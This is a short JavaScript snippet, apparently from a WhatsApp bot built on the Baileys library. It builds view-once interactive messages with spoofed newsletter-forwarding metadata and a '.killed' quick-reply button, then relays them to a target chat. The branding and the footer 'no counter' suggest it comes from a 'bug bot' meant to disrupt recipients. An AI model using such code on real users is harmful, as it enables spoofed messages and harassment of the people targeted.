let msg = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '120363313255786174@newsletter',
"newsletterName": 'ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄',
"serverMessageId": 1
},
},
"header": {
"title": ``,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: qio.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Alwaysaqio\nYAMETEH KUDANIL😋😘\",\"id\":\".killed\"}"
}
],
"messageParamsJson": ""
}
}
}
}
}

qio.relayMessage(m.chat, msg, {});

> let target = m.chat

async function pnis() {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄',
"serverMessageId": 1
},
},
"header": {
"title": ``,
...(await prepareWAMessageMedia({ image: mengkece }, { upload: qio.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "# Alwaysaqio no counter"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Alwaysaqioo\nYAMETEH KUDANIL\",\"id\":\".killed\"}"
}
],
"messageParamsJson": ""
}
}
}
}
}), { userJid: target, quoted: m })
await qio.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

pnis()